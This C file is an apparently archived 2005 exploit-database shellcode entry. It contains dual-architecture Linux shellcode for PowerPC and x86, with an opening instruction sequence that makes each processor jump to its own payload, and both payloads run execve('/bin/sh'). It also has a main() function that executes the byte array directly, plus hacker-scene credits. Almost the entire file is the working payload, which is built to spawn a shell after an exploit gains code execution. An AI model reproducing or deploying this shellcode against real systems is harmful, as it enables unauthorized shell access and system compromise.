/*
 * -[ dual-linux.c ]-
 * by core@bokeoa.com (ripped from nemo@felinemenace.org)
 *                     ^-- much <3 brotha ;)
 *
 * execve("/bin/sh",{"/bin/sh",NULL},NULL) shellcode for linux (both the ppc
 * and x86 version.) I thought about adding mipsel but I don't feel up to it
 * at the moment.  In fact I feel like crap...
 *
 * Shoutz to nemo, andrewg, KF, ghandi, phased, MRX, Blue Boar, Solar Eclipse,
 * HDM, FX, Max Vision, MaXx, c0ntex, izik, xort, banned-it, hoglund, SkyLined,
 * Gera, Stealth (7350), Emmanuel, Hackademy, Raptor (0xdeadbeef), sh0k, jduck,
 * xfocus, LSD, ADM, b10z, 0dd, ES, runixd, packy, norse, mXn, thn, dragnet,
 * hdm, fozzy, str0ke, B|ueberry, <S>, rjohnson, Kaliman, capsyl, salvia,
 * amnesia, arcanum, eazyass, loophole, my family and so any others...
 *
 * irc.pulltheplug.org #social
 *
 * peace ~ metta ~
 *
 * References:
 * http://milw0rm.com/id.php?id=1318
 * http://www.phrack.org/phrack/57/p57-0x0e
 */

char dual_linux[] =
//
// These four bytes work out to the following instruction
// in ppc arch: "rlwnm   r16,r28,r29,13,4", which will
// basically do nothing on osx/ppc.
//
// However on x86 architecture the four bytes are 3
// instructions:
//
// "push/nop/jmp"
//
// In this way, execution will be taken to the x86 shellcode
// on an x86 machine, and the ppc shellcode when running
// on a ppc architecture machine.
//
"\x5f\x90\xeb\x48"

"\x69\x69\x69\x69"	/*nop*/
"\x69\x69\x69\x69"	/*nop*/
"\x69\x69\x69\x69"	/*nop*/
// linux/ppc execve /bin/sh by Charles Stevenson (core) <core@bokeoa.com>
"\x7c\x3f\x0b\x78"	/*mr	r31,r1 # optional instruction */
"\x7c\xa5\x2a\x79"	/*xor.	r5,r5,r5*/
"\x42\x40\xff\xf9"	/*bdzl+	10000454<main>*/
"\x7f\x08\x02\xa6"	/*mflr	r24*/
"\x3b\x18\x01\x34"	/*addi	r24,r24,308*/
"\x98\xb8\xfe\xfb"	/*stb	r5,-261(r24)*/
"\x38\x78\xfe\xf4"	/*addi	r3,r24,-268*/
"\x90\x61\xff\xf8"	/*stw	r3,-8(r1)*/
"\x38\x81\xff\xf8"	/*addi	r4,r1,-8*/
"\x90\xa1\xff\xfc"	/*stw	r5,-4(r1)*/
"\x3b\xc0\x01\x60"	/*li	r30,352*/
"\x7f\xc0\x2e\x70"	/*srawi	r0,r30,5*/
"\x44\xde\xad\xf2"	/*.long	0x44deadf2*/
"/bin/shZ" // the last byte becomes NULL

// lnx_binsh4.c - v1 - 23 Byte /bin/sh sysenter Opcode Array Payload
// Copyright(c) 2005 c0ntex <c0ntex@open-security.org>
// Copyright(c) 2005 BaCkSpAcE <sinisa86@gmail.com>
"\x6a\x0b\x58\x99\x52\x68\x2f\x2f"
"\x73\x68\x68\x2f\x62\x69\x6e\x54"
"\x5b\x52\x53\x54\x59\x0f\x34";

int main(int ac, char **av)
{
       void (*fp)() = dual_linux;
       fp();
}

// in loving memory of hack.co.za

// milw0rm.com [2005-11-15]